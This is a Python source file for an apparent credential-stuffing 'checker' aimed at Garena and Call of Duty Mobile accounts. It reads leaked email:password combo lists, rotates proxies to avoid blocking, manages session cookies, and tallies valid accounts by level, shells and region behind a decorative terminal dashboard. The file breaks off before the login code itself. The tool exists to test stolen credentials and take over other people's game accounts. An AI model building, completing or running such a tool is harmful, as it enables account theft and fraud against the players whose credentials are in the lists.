 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
import hashlib
import json
import logging
import threading
import random
import os
import re
import sys
import time
import urllib.parse
import math
import uuid
import subprocess
import platform
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from threading import Lock, Event, local
from collections import deque
import signal

import colorama
import requests
from Crypto.Cipher import AES

colorama.init(autoreset=True)

# ============================================
# 🎨 SHIN PALAUTOG UI COLORS & STYLES
# ============================================

RED = '\033[38;2;255;0;85m'
GREEN = '\033[38;2;57;255;20m'
CYAN = '\033[38;2;0;255;255m'
YELLOW = '\033[38;2;255;255;0m'
MAGENTA = '\033[38;2;218;112;214m'
BLUE = '\033[38;2;0;150;255m'
WHITE = '\033[38;2;248;248;255m'
ORANGE = '\033[38;2;255;165;0m'
BRIGHT_BLACK = '\033[38;2;105;105;105m'
GRAY = '\033[38;2;128;128;128m'
RESET = '\033[0m'

# ============================================
# GLOBALS
# ============================================

FILE_LOCK = Lock()
_SCRIPT_DIR_COOKIE = os.path.dirname(os.path.abspath(__file__))
_TG_HOOK = None

# ============================================
# ORIGINAL COD.PY CONSTANTS (Preserved)
# ============================================

CODM_REGIONS = {
    'PH': {'name': 'Philippines', 'code': '63', 'flag': '🇵🇭'},
    'ID': {'name': 'Indonesia', 'code': '62', 'flag': '🇮🇩'},
    'HK': {'name': 'Hong Kong', 'code': '852', 'flag': '🇭🇰'},
    'MY': {'name': 'Malaysia', 'code': '60', 'flag': '🇲🇾'},
    'TW': {'name': 'Taiwan', 'code': '886', 'flag': '🇹🇼'},
    'TH': {'name': 'Thailand', 'code': '66', 'flag': '🇹🇭'},
    'SG': {'name': 'Singapore', 'code': '65', 'flag': '🇸🇬'},
    'VN': {'name': 'Vietnam', 'code': '84', 'flag': '🇻🇳'},
    'MM': {'name': 'Myanmar', 'code': '95', 'flag': '🇲🇲'},
    'KH': {'name': 'Cambodia', 'code': '855', 'flag': '🇰🇭'},
    'LA': {'name': 'Laos', 'code': '856', 'flag': '🇱🇦'},
    'BN': {'name': 'Brunei', 'code': '673', 'flag': '🇧🇳'}
}

DEFAULT_THREADS = 5
CHECK_OTHER_GAMES = False
GAME_FILE_MAP = {
    'CODM': 'CODM.txt',
    'FREEFIRE': 'FreeFire.txt',
    'FREE FIRE': 'FreeFire.txt',
    'ROV': 'ROV.txt',
    'DELTA FORCE': 'DeltaForce.txt',
    'AOV': 'AOV.txt',
    'SPEED DRIFTERS': 'SpeedDrifters.txt',
    'BLACK CLOVER M': 'BlackCloverM.txt',
    'GARENA UNDAWN': 'Undawn.txt',
    'FC ONLINE': 'FCOnline.txt',
    'FC ONLINE M': 'FCOnlineM.txt',
    'MOONLIGHT BLADE': 'MoonlightBlade.txt',
    'FAST THRILL': 'FastThrill.txt',
    'THE WORLD OF WAR': 'WorldOfWar.txt'
}

GAME_DISPLAY_NAMES = [
    ('CODM', 'CODM'),
    ('FREEFIRE', 'Free Fire'),
    ('ROV', 'ROV'),
    ('DELTA FORCE', 'Delta Force'),
    ('AOV', 'AOV'),
    ('SPEED DRIFTERS', 'Speed Drifters'),
    ('BLACK CLOVER M', 'Black Clover M'),
    ('GARENA UNDAWN', 'Undawn'),
    ('FC ONLINE', 'FC Online'),
    ('FC ONLINE M', 'FC Online M'),
    ('MOONLIGHT BLADE', 'Moonlight Blade'),
    ('FAST THRILL', 'Fast Thrill'),
    ('THE WORLD OF WAR', 'World of War')
]

OAUTH_MAX_RETRIES = 3
OAUTH_RETRY_DELAY = 2

# ============================================
# UI HELPER FUNCTIONS (From SHIN PALAUTOG)
# ============================================

def get_display_width(text):
    """Get display width of text (strips ANSI codes)"""
    plain_text = re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', text)
    return len(plain_text)

def format_size(size_bytes):
    """Format file size in human readable format"""
    if size_bytes == 0:
        return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB")
    i = int(math.floor(math.log(size_bytes, 1024)))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return f"{s}{size_name[i]}"

def get_unique_progress_bar(count, total, length=30):
    """Get a colored progress bar"""
    if total == 0:
        progress = 0
    else:
        progress = count / total
    filled_length = int(length * progress)
    bar = '█' * filled_length + '░' * (length - filled_length)
    if progress < 0.33:
        color = RED
    elif progress < 0.66:
        color = YELLOW
    else:
        color = GREEN
    return f"{color}{bar}{RESET}"

def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

def add_indent(text, spaces=8):
    """Add indentation to text"""
    prefix = " " * spaces
    return "\n".join(prefix + line for line in text.split("\n"))

def _w(n=72):
    """Get terminal width"""
    try:
        cols = os.get_terminal_size((80, 24)).columns
        return min(cols - 4, n)
    except:
        return min(72, n)

def _strip_rich(text):
    """Strip rich formatting"""
    return re.sub('\\[/?[^\\]]+\\]', '', str(text))

def _ts():
    """Get current timestamp"""
    return datetime.now().strftime('%H:%M:%S')

def _kv(key, val, kc=None, vc=None, kw=18):
    """Print key-value pair"""
    kc = kc or GRAY
    vc = vc or WHITE
    clean_val = _strip_rich(str(val))
    print(f'  {kc}{key:<{kw}}{RESET}  {vc}{clean_val}{RESET}')

def _abox_open(title, bc=None, tc=None, w=None):
    """Open a box with title"""
    bc = bc or CYAN
    tc = tc or WHITE
    bw = w or _w(66)
    t = _strip_rich(title)
    tp = max(0, bw - len(t) - 1)
    print(f"  {bc}┏{'━' * (bw + 2)}┓{RESET}")
    print(f"  {bc}┃{RESET} {tc}{t}{RESET}{' ' * tp} {bc}┃{RESET}")
    print(f"  {bc}┣{'━' * (bw + 2)}┫{RESET}")

def _abox_row(key, val, vc=None, bc=None, kw=18, w=None):
    """Print a row in a box"""
    bc = bc or CYAN
    vc = vc or WHITE
    bw = w or _w(66)
    k = f'{GRAY}{key:<{kw}}{RESET}'
    v = f'{vc}{_strip_rich(str(val))}{RESET}'
    vis = kw + len(_strip_rich(str(val)))
    pad = max(0, bw - vis - 1)
    print(f"  {bc}┃{RESET} {k} {v}{' ' * pad} {bc}┃{RESET}")

def _abox_sep(bc=None, w=None):
    """Print a separator in a box"""
    bc = bc or CYAN
    bw = w or _w(66)
    print(f"  {bc}┠{'─' * (bw + 2)}┨{RESET}")

def _abox_close(bc=None, w=None):
    """Close a box"""
    bc = bc or CYAN
    bw = w or _w(66)
    print(f"  {bc}┗{'━' * (bw + 2)}┛{RESET}")

def _log(level: str, msg: str, indent: str = '  '):
    """Print a log message with icon"""
    log_icons = {
        'INFO': (CYAN, 'ℹ'),
        'SUCCESS': (GREEN, '✔'),
        'WARNING': (YELLOW, '⚠'),
        'ERROR': (RED, '✖'),
        'DEBUG': (GRAY, '·'),
        'REQUEST': (CYAN, '→'),
        'RESPONSE': (CYAN, '←'),
        'RETRY': (YELLOW, '↺'),
        'PROXY': (MAGENTA, '⬡'),
        'THREAD': (MAGENTA, '⧫'),
        'SAVE': (GREEN, '⬇')
    }
    col, icon = log_icons.get(level, (GRAY, '·'))
    ts = _ts()
    clean = _strip_rich(msg)
    print(f'{indent}{GRAY}[{ts}]{RESET}  {col}{icon}{RESET}  {clean}')

# ============================================
# BANNER (UPDATED - SHIN PALAUTOG CODM CHECKER)
# ============================================

def display_banner():
    """Display the premium banner with device info"""
    clear_screen()
    
    def get_prop(prop):
        try:
            return subprocess.check_output(["getprop", prop], text=True, stderr=subprocess.DEVNULL).strip() or "Unknown"
        except:
            return "Unknown"

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
                        

    try:
        brand = get_prop("ro.product.brand").upper()
        model = get_prop("ro.product.model")
        dev_name = get_prop("ro.product.marketname")
        if dev_name == "Unknown":
            dev_name = model
        chipset = get_prop("ro.board.platform")
        if chipset == "Unknown":
            chipset = get_prop("ro.hardware")
        android_ver = get_prop("ro.build.version.release")
        build = get_prop("ro.build.display.id")
    except:
        dev_name = platform.node() or "Unknown"
        brand = "Unknown"
        model = "Unknown"
        chipset = platform.machine() or "Unknown"
        android_ver = platform.release() or "Unknown"
        build = platform.version() or "Unknown"

    ascii_art = [
        r"⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀",
        r"⠀⠀⠀⠀⠀⣼⣿⣿⣟⣻⣿⡏⠻⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀",
        r"⠀⠀⠀⠀⣼⣿⣿⣿⢿⣿⣿⠗⠀⢹⣿⣿⣟⡄⠀⠀⠀⠀⠀",
        r"⠀⠀⠀⢰⣿⣿⣇⣻⡮⢟⠛⠛⠛⣻⣿⣿⣿⠘⡀⠀⠀⠀⠀",
        r"⠀⠀⠀⢸⣿⣿⡿⣷⡰⠀⠀⣀⢉⣸⣿⣿⣿⡶⠁⠀⠀⠀⠀",
        r"⠀⠀⠀⢸⣿⣿⣽⣶⣦⡀⢾⣏⠐⣿⣿⣿⠿⠀⠀⠀⠀⠀⠀",
        r"⠀⠀⠀⠈⢟⡿⠿⠟⠿⣙⡄⠈⠓⡄⠉⠀⠀⠀⠀⠀⠀⠀⠀",
        r"⠀⠀⠀⠀⢰⠃⠀⠀⠀⠈⠉⡖⠀⡟⠢⡄⠀⡀⠀⠀⠀⠀⠀",
        r"⠀⠀⠀⠀⢸⠀⠀⠀⢢⠀⢀⡆⠀⡇⠀⠈⠢⡈⠠⠀⠀⠀⠀",
        r"⠀⠀⠀⠀⠘⡆⠀⠀⠈⣧⢸⠀⠀⡇⠢⡀⠀⠈⠦⡇⠀⠀⠀",
        r"⠀⠀⠀⠀⠀⠹⡆⠀⠀⢨⠃⠀⠀⣇⠀⠈⠢⠀⠀⠈⢢⠀⠀",
        r"⠀⠀⠀⠀⠀⠀⠑⡀⠀⠇⠀⠀⠀⡇⠳⡀⠀⢱⠀⠀⠀⢳⡀",
        r"⠀⠀⠀⠀⠀⠀⠀⠱⣾⠀⠀⠀⠀⡇⠀⠑⡀⡸⠄⠀⠀⣜⢘",
        r"⠀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠀⠀⣰⢀⣤⡤⠼⣧⣤⣤⡾⠟⠁",
        r"⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠑⠒⠉⠉⠁⠀⢠⠀⣽⠁⠀⠀⠀",
        r"⠀⠀⠀⠀⠀⢀⡠⠔⠉⠈⠣⠀⠀⠀⠀⠀⠀⣰⡏⠀⠀⠀⠀",
        r"⠀⠀⠀⢠⡖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠀⡇⠃⠀⠀⠀⠀",
        r"⠀⠀⣴⠛⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⢀⠃⠃⠀⠀⠀⠀",
        r"⠀⡼⠃⣸⡉⠢⠀⠀⢆⠀⠀⠀⠀⠀⠁⠀⠼⣦⡆⠀⠀⠀⠀",
        r"⢰⠁⠀⠏⡇⠀⠈⠐⢬⣄⠀⠀⠀⠀⠀⢀⣼⢿⠅⠀⠀⠀⠀",
        r"⢸⠀⢠⢀⠁⠀⠀⠀⠀⢇⠈⠁⢒⠖⠊⠉⠀⠘⡆⠀⠀⠀⠀",
        r"⢸⠀⡜⡘⠀⠀⠀⠀⠀⠘⣦⠔⠁⠀⠀⠀⠀⠀⠸⡄⠀⠀"
    ]

    box_w = 44
    title1 = "SHIN PALAUTOG CODM CHECKER"
    title2 = "POWERED BY SHIN PALAUTOG CODM CHECKER"

    info_lines = [
        f"╭{'─' * (box_w - 2)}╮",
        f"│ {CYAN}{title1.center(box_w - 4)}{RESET} │",
        f"│ {YELLOW}{title2.center(box_w - 4)}{RESET} │",
        f"├{'─' * (box_w - 2)}┤"
    ]

    rows = [
        ("DEVICE NAME:", dev_name),
        ("BRAND:", brand),
        ("MODEL:", model),
        ("CHIPSET:", chipset),
        ("ANDROID VERSION:", android_ver),
        ("BUILD:", build)
    ]

    for lbl, val in rows:
        clean_val = re.sub(r'[^\x20-\x7E]', '', str(val)).strip()
        max_v_len = box_w - 5 - len(lbl)
        val_str = clean_val[:max_v_len] if len(clean_val) > max_v_len else clean_val
        combined_text_len = len(lbl) + 1 + len(val_str)
        pad_len = (box_w - 4) - combined_text_len
        pad = " " * max(0, pad_len)
        info_lines.append(f"│ {MAGENTA}{lbl}{RESET} {GREEN}{val_str}{RESET}{pad} │")

    info_lines.append(f"╰{'─' * (box_w - 2)}╯")

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

    print("")
    for i in range(len(ascii_art)):
        art_part = ascii_art[i] if i < len(ascii_art) else ""
        info_part = info_lines[i] if i < len(info_lines) else ""
        print(f"  {RED}{art_part.ljust(26)}{RESET} {info_part}")
    print("\n")


# ============================================
# LIVE STATS UI (From SHIN PALAUTOG)
# ============================================

GARENA_UI_HEIGHT = 11

def build_live_stats_ui(stats, width=75):
    """Build the live stats dashboard UI"""
    anims = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    anim_char = anims[int(time.time() * 10) % len(anims)]

    def pad(label, value, color):
        label_str = f" {label}"
        visible_text = f"{label_str:<13}: {value}"
        pad_len = max(0, 35 - len(visible_text))
        return f"{WHITE}{label_str:<13}{GRAY}:{RESET} {color}{value}{RESET}{' ' * pad_len}"

    c1_r1 = pad("VALID", stats.get('valid', 0), GREEN)
    c1_r2 = pad("INVALID", stats.get('invalid', 0), RED)
    c1_r3 = pad("CLEAN", stats.get('clean', 0), GREEN)
    c1_r4 = pad("NOT CLEAN", stats.get('not_clean', 0), RED)
    checked_amt = stats.get('checked', 0)
    total_amt = stats.get('total', 0)
    c1_r5 = pad("TOTAL", f"{checked_amt}/{total_amt}", WHITE)

    c2_r1 = pad("HAS CODM", stats.get('has_codm', 0), CYAN)
    c2_r2 = pad("NO CODM", stats.get('no_codm', 0), YELLOW)
    c2_r3 = pad("H. LEVEL", stats.get('high_lvl', 0), MAGENTA)
    c2_r4 = pad("H. SHELLS", stats.get('high_shell', 0), YELLOW)
    c2_r5 = pad("TIME", f"{stats.get('elapsed', 0):.2f}s", WHITE)

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

    top = f"{GRAY}╭{'─'*35}┬{'─'*35}╮{RESET}"
    head = f"{GRAY}│ {CYAN}{anim_char} ACCOUNTS{' '*24}{GRAY}│ {CYAN}CODM DETAILS{' '*22}{GRAY}│{RESET}"
    mid1 = f"{GRAY}├{'─'*35}┼{'─'*35}┤{RESET}"
    
    row1 = f"{GRAY}│{c1_r1}{GRAY}│{c2_r1}{GRAY}│{RESET}"
    row2 = f"{GRAY}│{c1_r2}{GRAY}│{c2_r2}{GRAY}│{RESET}"
    row3 = f"{GRAY}│{c1_r3}{GRAY}│{c2_r3}{GRAY}│{RESET}"
    row4 = f"{GRAY}│{c1_r4}{GRAY}│{c2_r4}{GRAY}│{RESET}"
    row5 = f"{GRAY}│{c1_r5}{GRAY}│{c2_r5}{GRAY}│{RESET}"
    mid2 = f"{GRAY}├{'─'*71}┤{RESET}"
    
    bar_len = 44
    progress = stats.get('progress', 0) / 100.0 if stats.get('total', 1) > 0 else 0
    filled = int(bar_len * progress)
    
    filled_str = '━' * filled
    empty_str = '━' * (bar_len - filled)
    prog_percent = f"{stats.get('progress', 0):.1f}%"
    
    prog_label = f" {WHITE}{'PROGRESS':<13}{GRAY}:{RESET} "
    prog_bar_colored = f"{MAGENTA}{filled_str}{BRIGHT_BLACK}{empty_str}{RESET}  {WHITE}{prog_percent}{RESET}"

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

    raw_prog_len = 62 + len(prog_percent)
    prog_pad = max(0, 71 - raw_prog_len)
    
    prog_row = f"{GRAY}│{prog_label}{prog_bar_colored}{' '*prog_pad}{GRAY}│{RESET}"
    bot = f"{GRAY}╰{'─'*71}╯{RESET}"

    return "\n".join([top, head, mid1, row1, row2, row3, row4, row5, mid2, prog_row, bot])

def display_summary(total_checked, failed, valid, categorized_levels, countries, original_total, highest_clean=0, highest_not_clean=0, highest_shells=0):
    """Display final summary using box UI"""
    w = _w(72)
    
    print(f"\n  {CYAN}╔{'═' * (w - 4)}╗{RESET}")
    title = " 𝐅𝐈𝐍𝐀𝐋 𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐌𝐌𝐀𝐑𝐘 "
    title_pad = (w - 4) - len(title) - 1
    print(f"  {CYAN}║{YELLOW}{title}{RESET}{' ' * title_pad}{CYAN}║{RESET}")
    print(f"  {CYAN}╠{'═' * (w - 4)}╣{RESET}")
    
    print(f"  {CYAN}║{RESET} {GRAY}METRIC{' ' * 20}{RESET}{' ' * 5}{GRAY}RESULT{RESET}{' ' * 20} {CYAN}║{RESET}")
    print(f"  {CYAN}╠{'─' * (w - 4)}╣{RESET}")
    print(f"  {CYAN}║{RESET} {WHITE}TOTAL CHECKED{' ' * 20}{RESET} {GREEN}{total_checked}/{original_total}{RESET}{' ' * 20} {CYAN}║{RESET}")
    print(f"  {CYAN}║{RESET} {WHITE}VALID{' ' * 28}{RESET} {GREEN}{valid}{RESET}{' ' * 30} {CYAN}║{RESET}")
    print(f"  {CYAN}║{RESET} {WHITE}FAILED{' ' * 27}{RESET} {RED}{failed}{RESET}{' ' * 30} {CYAN}║{RESET}")
    
    print(f"  {CYAN}╠{'─' * (w - 4)}╣{RESET}")
    level_ranges = {
        "1-49": categorized_levels.get("1-49", 0),
        "50-99": categorized_levels.get("50-99", 0),
        "100-199": categorized_levels.get("100-199", 0),
        "200-299": categorized_levels.get("200-299", 0),
        "300-400": categorized_levels.get("300-400", 0)
    }
    for lr, count in level_ranges.items():
        print(f"  {CYAN}║{RESET} {WHITE}LEVEL {lr}{' ' * 23}{RESET} {CYAN}{count}{RESET}{' ' * 30} {CYAN}║{RESET}")
    
    if countries:
        print(f"  {CYAN}╠{'─' * (w - 4)}╣{RESET}")
        country_counts = {}
        for c in countries:
            c_name = re.sub(r'\s*\([^)]*\)', '', c).strip()
            country_counts[c_name] = country_counts.get(c_name, 0) + 1
        for country, count in sorted(country_counts.items(), key=lambda i: i[1], reverse=True)[:10]:
            print(f"  {CYAN}║{RESET} {WHITE}COUNTRY: {country:<20}{RESET} {MAGENTA}{count}{RESET}{' ' * 30} {CYAN}║{RESET}")
    
    print(f"  {CYAN}╠{'─' * (w - 4)}╣{RESET}")
    print(f"  {CYAN}║{RESET} {WHITE}HIGHEST CLEAN{' ' * 20}{RESET} {GREEN}Level {highest_clean}{RESET}{' ' * 20} {CYAN}║{RESET}")
    print(f"  {CYAN}║{RESET} {WHITE}HIGHEST NOT CLEAN{' ' * 15}{RESET} {RED}Level {highest_not_clean}{RESET}{' ' * 20} {CYAN}║{RESET}")
    print(f"  {CYAN}║{RESET} {WHITE}HIGHEST SHELL{' ' * 20}{RESET} {YELLOW}{highest_shells}{RESET}{' ' * 30} {CYAN}║{RESET}")
    
    print(f"  {CYAN}╚{'═' * (w - 4)}╝{RESET}\n")

# ============================================
# FILE SELECTION UI (From SHIN PALAUTOG)
# ============================================

def find_and_list_account_files():
    """Find and display all account files in Combo folder"""
    combo_dir = 'Combo'
    if not os.path.exists(combo_dir):
        os.makedirs(combo_dir)
        return None

    file_details = []
    for filename in os.listdir(combo_dir):
        file_path = os.path.join(combo_dir, filename)
        if os.path.isfile(file_path) and filename.endswith(".txt"):
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    line_count = sum(1 for _ in f if _.strip())
                file_size = os.path.getsize(file_path)
                file_details.append((file_path, file_size, line_count))
            except:
                pass

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

    if not file_details:
        return None

    print(f"\n  {GRAY}╔{'═' * 61}╗{RESET}")
    title = " SELECT A COMBO FILE"
    print(f"  {GRAY}║{YELLOW}{title}{RESET}{' ' * (61 - len(title))}{GRAY}║{RESET}")
    print(f"  {GRAY}╠══════╦═══════════════════════════════════╦═════════╦════════╣{RESET}")
    print(f"  {GRAY}║{WHITE} NO.  {GRAY}║{WHITE} FILENAME                          {GRAY}║{WHITE} SIZE    {GRAY}║{WHITE} LINES  {GRAY}║{RESET}")

    for i, (path, size, count) in enumerate(file_details, 1):
        name = os.path.basename(path)
        if len(name) > 33:
            name = name[:30] + '...'
        size_str = format_size(size)
        count_str = f"{count:,}"

        print(f"  {GRAY}╠══════╬═══════════════════════════════════╬═════════╬════════╣{RESET}")
        c1_text = f"[ {i} ]".center(6)
        c1 = f"{YELLOW}{c1_text}{RESET}"
        c2_text = f" {name}"
        c2 = f"{WHITE}{c2_text}{RESET}{' ' * max(0, 35 - len(c2_text))}"
        c3_text = f" {size_str}"
        c3 = f"{YELLOW}{c3_text}{RESET}{' ' * max(0, 9 - len(c3_text))}"
        c4_text = f" {count_str}"
        c4 = f"{GREEN}{c4_text}{RESET}{' ' * max(0, 8 - len(c4_text))}"
        print(f"  {GRAY}║{c1}{GRAY}║{c2}{GRAY}║{c3}{GRAY}║{c4}{GRAY}║{RESET}")

    print(f"  {GRAY}╚══════╩═══════════════════════════════════╩═════════╩════════╝{RESET}\n")
    return [item[0] for item in file_details]

def prompt_for_duplicate_removal(file_path):
    """Prompt user to remove duplicates from file"""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        original_count = len(lines)
        unique_lines = list(dict.fromkeys([line for line in lines if line.strip()]))
        duplicates_removed = original_count - len(unique_lines)
        if duplicates_removed > 0:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(unique_lines)
            _log('SUCCESS', f'Removed {duplicates_removed} duplicate line(s).')
        else:
            _log('INFO', 'No duplicates were found.')
    except Exception as e:
        _log('ERROR', f'Error during duplicate removal: {e}')

def select_input_file_flow(show_auto_remove=False):
    """Complete file selection flow with prompts"""
    selected_file_path = None
    while True:
        available_files = find_and_list_account_files()
        if available_files:
            try:
                choice_str = input(f"  {GRAY}➤{YELLOW} SELECT COMBO FILE [1-{len(available_files)}] : {WHITE}").strip()
                print(RESET, end="")
                if not choice_str:
                    continue
                file_choice = int(choice_str) - 1
                if 0 <= file_choice < len(available_files):
                    selected_file_path = available_files[file_choice]
                    break
                else:
                    _log('ERROR', 'Invalid number.')
                    time.sleep(1)
            except (ValueError, IndexError):
                _log('ERROR', 'Invalid input.')
                time.sleep(1)
        else:
            input(f"  {YELLOW}No combo found in 'Combo' folder. Press Enter to refresh...{RESET}")

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
            
    dup_choice = input(f"  {GRAY}➤{YELLOW} REMOVE DUPLICATE LINES? [Y/N] : {WHITE}").strip()
    print(RESET, end="")
    if dup_choice.lower() == 'y':
        prompt_for_duplicate_removal(selected_file_path)
        
    if show_auto_remove:
        auto_choice = input(f"  {GRAY}➤{YELLOW} AUTO-REMOVE CHECKED LINES? [Y/N] : {WHITE}").strip()
        print(RESET, end="")
        print()
        return selected_file_path, (auto_choice.lower() == 'y')
        
    print()
    return selected_file_path

# ============================================
# CORE FUNCTIONS (From cod.py - Preserved)
# ============================================

def sanitize_string(text):
    """Sanitize string to ASCII"""
    if not text or text == 'N/A':
        return text
    try:
        return text.encode('ascii', errors='ignore').decode('ascii')
    except:
        return re.sub('[^\\x00-\\x7F]+', '', str(text))

def clean_account_line(line):
    """Clean an account line"""
    if not line:
        return (None, None)
    line = line.strip().lstrip('\ufeff\ufffe')
    line = ''.join((char for char in line if char.isprintable() or char == ':'))
    if ':' not in line:
        return (None, None)
    try:
        parts = line.split(':', 1)
        if len(parts) != 2:
            return (None, None)
        account = parts[0].strip()
        password = parts[1].strip()
        account = sanitize_string(account)
        password = sanitize_string(password)
        if not account or not password:
            return (None, None)
        return (account, password)
    except:
        return (None, None)

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

def format_codm_region(region_code):
    """Format CODM region code"""
    if not region_code or region_code == 'N/A':
        return 'N/A'
    region_code = region_code.upper()
    region_info = CODM_REGIONS.get(region_code)
    if region_info:
        return f"{region_info['flag']} {region_info['name']} ({region_code})"
    else:
        return f'{region_code}'

def format_mobile_number(mobile_no, country_code=None):
    """Format mobile number with masking"""
    if not mobile_no or mobile_no == 'N/A' or (not str(mobile_no).strip()):
        return 'N/A'
    mobile_str = str(mobile_no).strip()
    mobile_str = mobile_str.replace('+', '').replace(' ', '').replace('-', '')
    if country_code:
        country_code = str(country_code).strip()
        if not mobile_str.startswith(country_code):
            if mobile_str.startswith('0'):
                mobile_str = country_code + mobile_str[1:]
            else:
                mobile_str = country_code + mobile_str
    detected_country_code = None
    for code_key, region_info in CODM_REGIONS.items():
        code = region_info['code']
        if mobile_str.startswith(code):
            detected_country_code = code
            break
    if detected_country_code:
        local_number = mobile_str[len(detected_country_code):]
        if len(local_number) >= 4:
            masked = '*' * (len(local_number) - 4) + local_number[-4:]
            return f'+{detected_country_code} {masked}'
        else:
            return f'+{detected_country_code} {local_number}'
    elif len(mobile_str) >= 4:
        masked = '*' * (len(mobile_str) - 4) + mobile_str[-4:]
        return f'+{masked}'
    else:
        return mobile_str

# ============================================
# SIGNAL HANDLER
# ============================================

def _sigint_handler(sig, frame):
    print(f'\n  {YELLOW}⚠  Ctrl+C – exiting immediately…{RESET}')
    os._exit(0)

signal.signal(signal.SIGINT, _sigint_handler)

# ============================================
# LOGGING SETUP
# ============================================

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': CYAN,
        'INFO': CYAN,
        'WARNING': YELLOW,
        'ERROR': RED,
        'CRITICAL': RED
    }
    ICONS = {
        'DEBUG': '⊡',
        'INFO': 'ℹ',
        'WARNING': '⚠',
        'ERROR': '✖',
        'CRITICAL': '☠'
    }
    RESET = RESET

    def format(self, record):
        levelname = record.levelname
        color = self.COLORS.get(levelname, '')
        icon = self.ICONS.get(levelname, '·')
        tag = f'{levelname:<8}'
        if color:
            record.msg = f'{color}{icon} {tag}{self.RESET} {record.msg}'
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.INFO)
logging.getLogger('urllib3').setLevel(logging.ERROR)
logging.getLogger('requests').setLevel(logging.ERROR)

# ============================================
# PROXY MANAGER (From cod.py)
# ============================================

class ProxyManager:
    def __init__(self, proxy_file='proxies.txt'):
        self.proxies = []
        self._index = 0
        self._lock = threading.Lock()
        self._load(proxy_file)

    _VALID_SCHEMES = ('http', 'https', 'socks4', 'socks4a', 'socks5', 'socks5h')

    def _parse_line(self, line):
        """Parse a single proxy line into a requests-style proxy dict."""
        scheme = 'http'
        rest = line
        if '://' in line:
            scheme, rest = line.split('://', 1)
            scheme = scheme.strip().lower()
            if scheme not in self._VALID_SCHEMES:
                _log('WARNING', f"Unknown proxy scheme '{scheme}' in line, defaulting to http")
                scheme = 'http'
            if '@' in rest:
                creds, hostport = rest.rsplit('@', 1)
                user, _, passwd = creds.partition(':')
            else:
                hostport = rest
                user = passwd = None
            host, _, port = hostport.partition(':')
            if not host or not port:
                return None
        else:
            parts = rest.split(':')
            if len(parts) == 4:
                host, port, user, passwd = parts
            elif len(parts) == 2:
                host, port = parts
                user = passwd = None
            elif '@' in rest:
                try:
                    creds, hostport = rest.rsplit('@', 1)
                    user, passwd = creds.split(':', 1)
                    host, port = hostport.split(':', 1)
                except Exception:
                    return None
            else:
                return None

        if user and passwd:
            url = f'{scheme}://{urllib.parse.quote(user, safe="")}:{urllib.parse.quote(passwd, safe="")}@{host}:{port}'
        else:
            url = f'{scheme}://{host}:{port}'
        return {'http': url, 'https': url}

    def _load(self, proxy_file):
        if not os.path.exists(proxy_file):
            return
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                proxy_dict = self._parse_line(line)
                if proxy_dict:
                    self.proxies.append(proxy_dict)
        if self.proxies:
            random.shuffle(self.proxies)

 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            
 
 
  
   
    
     
      
       
        
         
          
           
            
                
 
  
   
    
     
      
       
        
         
          
           
            

    def get_next(self):
        if not self.proxies:
            return None
        with self._lock:
            proxy = self.proxies[self._index % len(self.proxies)]
            self._index += 1
        return proxy

    def is_loaded(self):
        return len(self.proxies) > 0

# ============================================
# COOKIE MANAGER (From cod.py)
# ============================================

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.live_cookies = deque()
        self.lock = threading.Lock()
        self.load_banned_cookies()
